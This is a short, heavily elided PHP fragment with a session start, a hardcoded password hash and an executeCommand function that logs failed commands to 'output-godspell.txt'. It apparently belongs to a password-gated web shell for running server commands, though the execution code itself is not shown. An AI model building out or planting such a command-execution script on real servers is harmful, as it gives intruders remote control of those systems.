<?php
session_start();
$password = '$2a$12$IexNbjo5jdZtX5qmxio1p.ou30Jrl47L.DkW6OQAb1IvzEHWi.d6W'; 
...
function executeCommand($command) {
    ...
    if (empty($output)) {
        file_put_contents('output-godspell.txt', "Command failed: $command");
        return "Command execution failed. Check 'output-godspell.txt' for more details.";
    }
